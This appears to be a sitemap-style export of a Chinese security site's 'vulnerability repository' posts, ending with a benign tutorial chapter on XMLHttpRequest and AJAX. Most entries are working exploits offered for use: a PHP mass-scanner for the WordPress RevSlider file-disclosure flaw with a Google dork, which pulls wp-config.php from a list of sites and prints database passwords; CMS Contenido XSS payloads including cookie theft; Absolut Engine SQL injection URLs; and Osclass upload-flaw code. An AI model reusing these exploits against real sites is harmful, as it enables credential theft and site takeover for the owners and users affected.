<span class="attribute">type</span>=<span class="value">"hidden"</span> <span class="attribute">name</span>=<span class="value">"transistion_time"</span> <span class="attribute">value</span>=<span class="value">"0"</span> /&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"hidden"</span> <span class="attribute">name</span>=<span class="value">"save_gSlideShow_settings"</span> <span class="attribute">value</span>=<span class="value">"Save Settings"</span> /&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"submit"</span> <span class="attribute">value</span>=<span class="value">"Submit request"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="title">form</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="title">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="title">html</span>&gt;</span></div></pre></td></tr></table></figure>

]]></content>
         
         
           
             
              <breadCrumb title="漏洞仓库" url="http://www.weshell.net/categories/%E6%BC%8F%E6%B4%9E%E4%BB%93%E5%BA%93/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/Wordpress-RevSlider.html</loc>
    <lastmod>2015-01-02T13:39:52.000Z</lastmod>
    <data>
        <display>
        <title>WordpressRevSlider插件导致文件泄露</title>
        <pubTime>2015-01-02T12:20:16.000Z</pubTime>
        
         <content><![CDATA[<h3 id="0"><span class="label label-danger">漏洞标题：WordpressRevSlider插件导致文件泄露</span></h3>
<h3 id="1"><span class="label label-danger">受影响版本：ALL</span></h3>
<h3 id="2"><span class="label label-danger">有无利用方法：是</span></h3>
<p><br></p>
<h3 id="利用代码[表单构造]：">利用代码[表单构造]：</h3>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">谷歌语法：inurl:/admin-ajax.php?action=revslider_show_image</div><div class="line"></div><div class="line">本地构造表单</div><div class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">title</span>&gt;</span>Exploits Wordpress<span class="tag">&lt;/<span class="title">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="title">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">body</span> <span class="attribute">style</span>=<span class="value">"background-color: rebeccapurple;"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">pre</span>&gt;</span><span class="tag">&lt;<span class="title">p</span>&gt;</span><span class="tag">&lt;<span class="title">center</span> <span class="attribute">style</span>=<span class="value">"color: aqua;"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">pre</span>&gt;</span><span class="tag">&lt;<span class="title">href</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">form</span> <span class="attribute">method</span>=<span class="value">'POST'</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">textarea</span> <span class="attribute">name</span>=<span class="value">'sites'</span> <span class="attribute">cols</span>=<span class="value">'45'</span> <span class="attribute">rows</span>=<span class="value">'0'</span>&gt;</span><span class="tag">&lt;/<span class="title">textarea</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">br</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">'submit'</span> <span class="attribute">value</span>=<span class="value">'Exploit'</span> /&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="title">form</span>&gt;</span></div></pre></td></tr></table></figure>

<p><br></p>
<h3 id="利用代码[表单上传]">利用代码[表单上传]</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor">&lt;?php</span></div><div class="line">@set_time_limit(<span class="number">0</span>);</div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="variable">$sites</span> = explode(<span class="string">"\r\n"</span>, <span class="variable">$_POST</span>[<span class="string">'sites'</span>]);</div><div class="line"><span class="keyword">foreach</span>(<span class="variable">$sites</span> <span class="keyword">as</span> <span class="variable">$site</span>) {</div><div class="line"><span class="variable">$site</span> = trim(<span class="variable">$site</span>);</div><div class="line"><span class="variable">$ch</span> = curl_init();</div><div class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="string">"$site"</span>);</div><div class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">1</span>);</div><div class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</div><div class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_USERAGENT, <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0;</span></div><div class="line">Windows NT 5.0)");</div><div class="line"><span class="variable">$get</span> = curl_exec(<span class="variable">$ch</span>);</div><div class="line">curl_close(<span class="variable">$ch</span>);</div><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">"#WordPress (.*?)/&gt;#"</span>, <span class="variable">$get</span>, <span class="variable">$version</span>)){</div><div class="line"><span class="variable">$str</span> = str_replace(<span class="string">'/&gt;'</span>, <span class="string">""</span>, <span class="variable">$version</span>[<span class="number">0</span>]);</div><div class="line"><span class="variable">$str</span> = str_replace(<span class="string">'"'</span>, <span class="string">""</span>, <span class="variable">$str</span>);</div><div class="line">}</div><div class="line"><span class="variable">$users</span> = @file_get_contents(<span class="string">"$site/?author=1"</span>);</div><div class="line">preg_match(<span class="string">'/&lt;title&gt;;(.*?)&lt;\/title&gt;/si'</span>,<span class="variable">$users</span>,<span class="variable">$user</span>);</div><div class="line"><span class="variable">$wpuser</span> = explode(<span class="string">'|'</span>,<span class="variable">$user</span>[<span class="number">1</span>]);</div><div class="line"><span class="keyword">echo</span> <span class="string">" &lt;br&gt;======================================&lt;/br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">"Site : "</span>.<span class="variable">$site</span>.<span class="string">"&lt;br&gt; Wp User : "</span>.<span class="variable">$wpuser</span>[<span class="number">0</span>].<span class="string">"&lt;br&gt; Version :</span></div><div class="line">".<span class="variable">$str</span>.<span class="string">"&lt;br&gt;"</span>;</div><div class="line"><span class="variable">$ch</span> = curl_init();</div><div class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL,</div><div class="line"><span class="string">"$site/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php"</span>);</div><div class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HTTPGET, <span class="number">1</span>);</div><div class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER,<span class="number">1</span>);</div><div class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_USERAGENT, <span class="string">"Mozilla/4.0 (compatible; MSIE 5.01;</span></div><div class="line">Windows NT 5.0)");</div><div class="line"><span class="variable">$xp</span> = curl_exec (<span class="variable">$ch</span>);</div><div class="line">curl_close(<span class="variable">$ch</span>);</div><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">"#DB_USER#i"</span>,<span class="variable">$xp</span>)){</div><div class="line">preg_match(<span class="string">"#'DB_NAME', '(.*?)'#i"</span>,<span class="variable">$xp</span>,<span class="variable">$DB_NAME</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">"DB_NAME:{$DB_NAME[1]}&lt;br&gt;"</span>;</div><div class="line">preg_match(<span class="string">"#'DB_USER', '(.*?)'#i"</span>,<span class="variable">$xp</span>,<span class="variable">$DB_USER</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">"DB_USER:{$DB_USER[1]}&lt;br&gt;"</span>;</div><div class="line">preg_match(<span class="string">"#'DB_PASSWORD', '(.*?)'#i"</span>,<span class="variable">$xp</span>,<span class="variable">$DB_PASSWORD</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">"DB_PASSWORD:{$DB_PASSWORD[1]}&lt;br&gt;"</span>;</div><div class="line">preg_match(<span class="string">"#'DB_HOST', '(.*?)'#i"</span>,<span class="variable">$xp</span>,<span class="variable">$DB_HOST</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">"DB_HOST:{$DB_HOST[1]}&lt;br&gt;"</span>;</div><div class="line">}</div><div class="line"><span class="variable">$lt</span> =</div><div class="line"><span class="keyword">array</span>(<span class="string">"wp-content/themes/construct/lib/scripts/dl-skin.php"</span>,<span class="string">"wp-content/themes/persuasion/lib/scripts/dl-skin.php"</span>,<span class="string">"wp-content/themes/manbiz2/lib/scripts/dl-skin.php"</span>,<span class="string">"wp-content/themes/method/lib/scripts/dl-skin.php"</span>,<span class="string">"wp-content/themes/elegance/lib/scripts/dl-skin.php"</span>,<span class="string">"wp-content/themes/modular/lib/scripts/dl-skin.php"</span>,<span class="string">"wp-content/themes/myriad/lib/scripts/dl-skin.php"</span>,<span class="string">"wp-content/themes/echelon/lib/scripts/dl-skin.php"</span>,<span class="string">"wp-content/themes/fusion/lib/scripts/dl-skin.php"</span>,<span class="string">"wp-content/themes/awake/lib/scripts/dl-skin.php"</span>);</div><div class="line"><span class="keyword">foreach</span>(<span class="variable">$lt</span> <span class="keyword">as</span> <span class="variable">$l</span>){</div><div class="line"><span class="variable">$site</span> = <span class="string">"$site/$l"</span>;</div><div class="line"><span class="variable">$process</span> = curl_init(<span class="variable">$site</span>);</div><div class="line">curl_setopt(<span class="variable">$process</span>, CURLOPT_TIMEOUT, <span class="number">30</span>);</div><div class="line">curl_setopt(<span class="variable">$process</span>, CURLOPT_USERAGENT, <span class="string">"Mozilla/4.0 (compatible; MSIE</span></div><div class="line">7.0; Windows NT 6.0)");</div><div class="line">curl_setopt(<span class="variable">$process</span>, CURLOPT_HEADER, <span class="keyword">TRUE</span>);</div><div class="line">curl_setopt(<span class="variable">$process</span>, CURLOPT_POST, <span class="number">1</span>);</div><div class="line">curl_setopt(<span class="variable">$process</span>, CURLOPT_POSTFIELDS,</div><div class="line"><span class="string">"_mysite_download_skin=../../../../../wp-config.php"</span>);</div><div class="line">curl_setopt(<span class="variable">$process</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</div><div class="line">curl_setopt(<span class="variable">$process</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</div><div class="line"><span class="variable">$return</span> = curl_exec(<span class="variable">$process</span>);</div><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">"#DB_USER#i"</span>,<span class="variable">$return</span>)){</div><div class="line">preg_match(<span class="string">"#'DB_NAME', '(.*?)'#i"</span>,<span class="variable">$return</span>,<span class="variable">$DB_NAME</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">"DB_NAME:{$DB_NAME[1]}&lt;br&gt;"</span>;</div><div class="line">preg_match(<span class="string">"#'DB_USER', '(.*?)'#i"</span>,<span class="variable">$return</span>,<span class="variable">$DB_USER</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">"DB_USER:{$DB_USER[1]}&lt;br&gt;"</span>;</div><div class="line">preg_match(<span class="string">"#'DB_PASSWORD', '(.*?)'#i"</span>,<span class="variable">$return</span>,<span class="variable">$DB_PASSWORD</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">"DB_PASSWORD:{$DB_PASSWORD[1]}&lt;br&gt;"</span>;</div><div class="line">preg_match(<span class="string">"#'DB_HOST', '(.*?)'#i"</span>,<span class="variable">$return</span>,<span class="variable">$DB_HOST</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">"DB_HOST:{$DB_HOST[1]}&lt;br&gt;"</span>;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">" &lt;br&gt;-----------------------------------&lt;/br&gt;"</span>;</div><div class="line">ob_implicit_flush(<span class="keyword">true</span>);</div><div class="line">ob_end_flush();</div><div class="line">}</div><div class="line">}</div><div class="line">}</div><div class="line"><span class="preprocessor">?&gt;</span></div><div class="line">&lt;/pre&gt;&lt;/p&gt;&lt;/center&gt;</div></pre></td></tr></table></figure>

]]></content>
         
         
           
             
              <breadCrumb title="漏洞仓库" url="http://www.weshell.net/categories/%E6%BC%8F%E6%B4%9E%E4%BB%93%E5%BA%93/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/cms-contenido-xss.html</loc>
    <lastmod>2015-01-02T13:24:44.000Z</lastmod>
    <data>
        <display>
        <title>CMS Contenido 4.9.5 XSS跨站漏洞</title>
        <pubTime>2015-01-02T12:17:16.000Z</pubTime>
        
         <content><![CDATA[<h3 id="0"><span class="label label-danger">漏洞标题：CMSContenido4.9.5XSS跨站漏洞</span></h3>
<h3 id="1"><span class="label label-danger">受影响版本：CMSContenido4.9.5</span></h3>
<h3 id="2"><span class="label label-danger">有无利用方法：是</span></h3>
<p><br></p>
<h3 id="利用代码：">利用代码：</h3>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">If unexpected values are being transmitted via the parameters "idart",</div><div class="line">"lang" and/or "idcat" to the PHP-Script</div><div class="line"></div><div class="line">http://{IP/HOSTNAME}/cms/front_content.php</div><div class="line"></div><div class="line">an error will be thrown which displays the passed value to the user on the</div><div class="line">webpage without sanitizing it.</div><div class="line"></div><div class="line">Payload-Examples:</div><div class="line"></div><div class="line">http://{IP/HOSTNAME}/cms/front_content.php?idcat=41&lang=1<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">alert(<span class="string">"XSS"</span>)</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div><div class="line"></div><div class="line">http://{IP/HOSTNAME}/cms/front_content.php?idcat=41<span class="tag">&lt;<span class="title">iframe</span></span></div><div class="line">src="some_remote_src" <span class="attribute">height</span>=<span class="value">"200"</span> <span class="attribute">width</span>=<span class="value">"200"</span> &gt;<span class="tag">&lt;/<span class="title">iframe</span>&gt;</span></div><div class="line">&lang=1</div><div class="line"></div><div class="line">http://{IP/HOSTNAME}/cms/front_content.php?idart=32<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

]]></content>
         
         
           
             
              <breadCrumb title="漏洞仓库" url="http://www.weshell.net/categories/%E6%BC%8F%E6%B4%9E%E4%BB%93%E5%BA%93/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/absolut-engine.html</loc>
    <lastmod>2015-01-02T13:14:20.000Z</lastmod>
    <data>
        <display>
        <title>Absolut Engine CMS SQL注入及XSS漏洞</title>
        <pubTime>2015-01-02T02:17:16.000Z</pubTime>
        
         <content><![CDATA[<h3 id="0"><span class="label label-danger">受影响版本：AbsolutEngine1.73</span></h3>
<h3 id="1"><span class="label label-danger">漏洞原因：未严格过滤字符</span></h3>
<h3 id="2"><span class="label label-danger">是否有利用方法：是</span></h3>
<p><br></p>
<h3 id="SQL注入示例：">SQL注入示例：</h3>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">http://{TARGET}/admin/managersection.php?&username=admin&session=c8d7ebc95b9b1a72d3b54eb59bea56c7&sectionID=1</div><div class="line"></div><div class="line">http://{TARGET}/admin/managersection.php?&username=admin&session=c8d7ebc95b9b1a72d3b54eb59bea56c7&sectionID=1%27+and+1=2+union+select+1,version%28%29,3,4,5,6+--+</div><div class="line"></div><div class="line">http://{TARGET}/admin/edituser.php?username=admin&session=c8d7ebc95b9b1a72d3b54eb59bea56c7&userID=3</div><div class="line"></div><div class="line">http://{TARGET}/admin/edituser.php?username=admin&session=c8d7ebc95b9b1a72d3b54eb59bea56c7&userID=3%27+and+1=2+union+select+1,user%28%29,3,version%28%29,5,database%28%29,7,8,9+--+</div><div class="line"></div><div class="line">http://{TARGET}/admin/admin.php?username=admin&session=c8d7ebc95b9b1a72d3b54eb59bea56c7</div><div class="line"></div><div class="line">http://{TARGET}/admin/admin.php?username=admin%27+and+substring%28user%28%29,1,4%29=%27root%27+--+&session=c8d7ebc95b9b1a72d3b54eb59bea56c7</div><div class="line"></div><div class="line">http://{TARGET}/admin/managerrelated.php?username=user&session=ae29000d8570273c8917e874d029b336&articleID=0&title</div><div class="line"><span class="tag">&lt;<span class="title">http:</span>//<span class="attribute">localhost</span>/<span class="attribute">absolut</span>/<span class="attribute">admin</span>/<span class="attribute">managerrelated.php</span>?<span class="attribute">username</span>=<span class="value">user&session=ae29000d8570273c8917e874d029b336&articleID=0&title</span>&gt;</span>={some_title}</div><div class="line"></div><div class="line">http://{TARGET}/admin/managerrelated.php?username=user&session=ae29000d8570273c8917e874d029b336&articleID=0&title={some_title}%27+and+1=2+union+select+1,version%28%29,3,4,5,6,7,8,9,10,11,12+--+</div></pre></td></tr></table></figure>

<p><br></p>
<h3 id="XSS示例：">XSS示例：</h3>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://{TARGET}/admin/managerrelated.php?username=user&session=ae29000d8570273c8917e874d029b336&articleID=0&title=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E</div></pre></td></tr></table></figure>

]]></content>
         
         
           
             
              <breadCrumb title="漏洞仓库" url="http://www.weshell.net/categories/%E6%BC%8F%E6%B4%9E%E4%BB%93%E5%BA%93/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/osclass-upload-shell.html</loc>
    <lastmod>2015-01-02T12:51:30.000Z</lastmod>
    <data>
        <display>
        <title>Osclass 3.4.2上传漏洞</title>
        <pubTime>2015-01-02T02:17:16.000Z</pubTime>
        
         <content><![CDATA[<h3 id="0"><span class="label label-danger">受影响版本：3.4.2以下</span></h3>
<h3 id="1"><span class="label label-danger">漏洞原因：未验证上传文件类型</span></h3>
<h3 id="2"><span class="label label-danger">漏洞存在文件：/oc-includes/osclass/controller/contact.php</span></h3>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">if( osc_contact_attachment() ) {</div><div class="line">              $attachment   = Params::getFiles('attachment');</div><div class="line">               if(isset($attachment['tmp_name'])) {</div><div class="line">                   $resourceName = $attachment['name'];</div><div class="line">                   $tmpName      = $attachment['tmp_name'];</div><div class="line">                   $resourceType = $attachment['type'];</div><div class="line">                   $path = osc_uploads_path() . time() . '_' . $resourceName;</div><div class="line">                   if( !is_writable(osc_uploads_path()) ) {</div><div class="line">                       osc_add_flash_error_message( _m('There have been some errors ...</div><div class="line">                       $this-&gt;redirectTo( osc_contact_url() );</div><div class="line">                   }</div><div class="line">  </div><div class="line">                   if( !move_uploaded_file($tmpName, $path) ) {</div><div class="line">                       unset($path);</div><div class="line">                   }</div><div class="line">               }</div><div class="line">           }</div></pre></td></tr></table></figure>

]]></content>
         
         
           
             
              <breadCrumb title="漏洞仓库" url="http://www.weshell.net/categories/%E6%BC%8F%E6%B4%9E%E4%BB%93%E5%BA%93/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/four-xss.html</loc>
    <lastmod>2015-01-02T12:14:14.000Z</lastmod>
    <data>
        <display>
        <title>XML和AJAX介绍</title>
        <pubTime>2015-01-02T11:17:16.000Z</pubTime>
        
         <content><![CDATA[<h2 id="XML和AJAX介绍">XML和AJAX介绍</h2>
<p>我们假设本书的读者都有JavaScript和Html的基础，这两门技术都是基于一个被广泛传播很久的标准，已经有无数的关于他们是怎么工作以及你可以采用他们在网络上做什么的信息。然而，介于AJAX和XML(eXtensible Markup Language)刚刚被引入互联网世界，我们觉得对这两门技术进行一个基础的概述是很有必要的。</p>
<p>人们一般认为AJAX比XML更强一些，因为XML是AJAX的缩写的一部分。但是事实上并不是如此的。AJAX描述了一种可以有时悄悄进行web开发练习的方法。从基础上来说，AJAX是一组为了创建可以提高用户体验、可用性以及速度的Web应用的技术的集合。<br>在2005年这个词被主流Web开发者所使用，但AJAX的历史很悠久的。这门在今天被广泛使用的核心技术是由微软在开发远程脚本技术的时候首次使用。和传统的由DHTML定义的技术如IFRAME和LAYER比起来，由AJAX定义的这组技术是一个好的多选择。<br>AJAX的最基本的组成元素是XMLHttpRequest JavaScript对象。这个对象提供一种可以从远程服务器得到数据但是不需要刷新整个已经载入的页面的机制。根据使用的浏览器，这个对象可以产生很多不同的特色。XMLHttpRequest对象设计的很简单直观，下面的例子就是怎么发送请求以及使用请求。</p>
<h3 id="code">code</h3>
<pre><code>
// instantiate new XMLHttpRequest
 var request = new XMLHttpRequest;
 // handle request result
 request.onreadystatechange = function () {
    if (request.readyState == 4) {
       // do something with the content
  alert(request.responseText);
    }
};
 // open a request to /service.php
 request.open('GET', '/service.php', false)
 // send the request
 request.send(null);</code></pre>

<h2 id="XMLhttpRequest">XMLhttpRequest</h2>
<p> 由于各种原因，XMLHttpRequest对象并不能在所有浏览器上以相同的方式执行。这是由于AJAX是一门新技术，虽然他的标准很快就被制定了，但是仍然有很多我们需要解决各种浏览器的互斥问题的情况。这些问题通常是借助于AJAX的库来解决，但是作为安全研究，我们一般都要使用纯净的基础版本。<br>正如我们前面提到的，XMLHttpRequest对象是依赖浏览器版本的。例如微软的IE浏览器需要使用ActiveXObjext(‘Msxml2.XMLHTTP’)或者甚至是ActiveXObjext(‘Microsoft.XMLHTTP’)来创建和标准的XMLHttpRequest类似的对象。其余的浏览器也许有不同的方法来实现相同的事情，为了保证可以适配所有的浏览器的不同之处，我们通常喜欢用这里定义的函数：</p>
<h3 id="code_demo">code demo</h3>
<pre><code>
function getXHR () {
    var xhr = null;
    if (window.XMLHttpRequest) {
        xhr = new XMLHttpRequest();
    } else if (window.createRequest) {
        xhr = window.createRequest();
    } else if (window.ActiveXObjext) {
        try {
            xhr = new ActiveXObjext('Msxml2.XMLHTTP');
        } catch(e) {
            try {
                xhr = new ActiveXObjext('Microsoft.XMLHTTP');
            } catch (e) {}
        }
    }
 return xhr;
};
 // make new XMLHttpRequest objext
 var xhr = getXHR();
 </code></pre>

<p>表1.1总结了XMLHttpRequest对象的方法和属性<br>abort()中止请求<br>方法/属性    描述<br>abort()    中止请求<br>getAllResponseHeaders()    以字符串的形式取回响应的头部<br>getResponseHeader(name)    取回特定名字的头部的值<br>setRequestHeader(name, value)    根据名字设定头部的值<br>open(method, URL, [asynchronous], [username, password])    设定使用的方法以及取回的网址，打开请求对象<br>onreadystatechange    这个属性可以获得当这个请求通过不同的状态时将要调用的事件的引用<br>readyState    readyState参数定义了请求的状态，可能的值有:<br>0 – 未初始化<br>1 – 打开<br>2 – 已发出<br>3 – 正在接收<br>4 – 加载完成<br>status    status属性返回响应状态码，如果请求成功则是200，如果需要重定向则是302，其他的状态码也是可能的<br>statusText    这个属性返回和状态码相关的描述<br>responseText    responseText属性返回响应体<br>responseXML    responseXML与responseText相似，但是如果服务器以XML作为响应，浏览器将将它转化为易存储的结构，这种结构通常被称为Documnet Object Model(DOM)<br>请注意responseXML和responseText的区别，他们都是返回响应体，但他们在功能方面确实有一些不同。</p>
<p>特别地，responseText被用于取回文本文档、HTML页面、二进制页面以及所有不是XML格式的网页。当我们需要处理XML的时候，我们使用responseXML属性，它会将响应文档解析成DOM对象。</p>
<h2 id="responeseXML">responeseXML</h2>
<p>我们已经展示了，responseText是怎么工作的，所以让我们看一下responseXML的应用。在提供另一个例子之前，我们先解释一下XML的作用。</p>
<p>XML是用来展示含义而不是像HTML那样展示结构，XML是一种具有具有自我描述性的没有作为的语言。其他与XML标准相关的是XPath, Extensible Stylesheet Language Transformation(XSLT), XML Schema Definition (XSD), Xlink, XForms, Simple Object Access Protecol (SOAP), XMLRPC等等。我们不能对这些全部进行讲解，因为这已经超出了本书 的范围，但是你可以在www.w3c.org上查阅他们。</p>
<p>虽然XML和HTML不同，但是他们都是由被称作元素和标签的块组成的。XML和HTML的元素都是高度结构化的。他们可以用一个树的结构表现，这通常被称作DOM。事实上，DOM是由World Wide Web Consortium定义的一组规格，它定义了XML结构是怎么被创建的以及他具有哪些方法属性，正如我们前面所说，HTML也可以被解析成DOM树。</p>
<p>其中一个最常使用的DOM函数是getElementsByTagName,它返回一个元素的数组。另一个流行的函数是getElementById，返回一个基于id的单独的元素。例如，借助JavaScript的帮助，我们可以轻松的提取所有的</p><p>元素并且用”Hello World”代替他们。例如:</p>
<h3 id="demo_code">demo code</h3>
<pre><code>
// get a list of all element
 var p = document.getElementsByTagName('p');
 // iterate over the list
 for (var i = 0; i < p.lenght; i++) {
// set the text of each to 'Hello World!'
 p[i].innerHTML = 'Hello World'
}
 </code></pre>

<p>采用类似的方法，我们可以和XMLHttpRequest对象中的XML响应属性相互配合，就如前面描述的那样。例如：</p>
<h3 id="code_demo_2">code demo 2</h3>
<pre><code>
function getXHR () {
    var xhr = null;
    if (window.XMLHttpRequest) {
        xhr = new XMLHttpRequest();
    } else if (window.createRequest) {
        xhr = window.createRequest();
    } else if (window.ActiveXObjext) {
        try {
            xhr = new ActiveXObjext('Msxml2.XMLHTTP');
        } catch(e) {
            try {
                xhr = new ActiveXObjext('Microsoft.XMLHTTP');
            } catch (e) {}
        }
    }

    return xhr;
};
// make new XMLHttpRequest object
var request = getXHR();
 // handle request result
 request.onreadystatechange = function () {
    if (request.readyState == 4) {
 // do something with the content but in XML
 alert(request.responseXML.getElementsById('message'));
    }
};
 // open a request to /service.xml.php
request.open('GET', '/service.xml.php', false)
 // send the request
 request.send(null);
// make new XMLHttpRequest objext
 var xhr = getXHR();
 </code></pre>

<p>如果服务器响应包括以下内容：</p>
<h3 id="code_demo_3">code demo 3</h3>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">messageForYou</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="title">overHere</span> <span class="attribute">id</span>=<span class="value">"message"</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="title">overHere</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="title">messageForYou</span>&gt;</span></div></pre></td></tr></table></figure>

<p>浏览器就将在一个警告框里显示”Hello World!”。<br>理解基础的XML和AJAX是很重要的，它们已经成为了Internet不可或缺的一部分，它们对于理解这些技术对于传统Web应用的安全测试的影响也是很重要的。</p>
<h2 id="总结">总结</h2>
<p>XSS是一种可以窃取敏感信息、劫持用户sessions、危机浏览器以及系统安全的攻击向导，XSS攻击自从Web早期就已经存在。今天他们对于电子商务产生了最大的威胁。</p>
]]></content>
         
         
           
             
              <breadCrumb title="知识百科" url="http://www.weshell.net/categories/%E7%9F%A5%E8%AF%86%E7%99%BE%E7%A7%91/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/two-xss.html</loc>
    <lastmod>2015-01-02T11:51:46.000Z</lastmod>
    <data>
        <display>
        <title>跨站之Web应用安全</title>
        <pubTime>2015-01-02T11:17:16.000Z</pubTime>
        
         <content><![CDATA[<h2 id="前言">前言</h2>
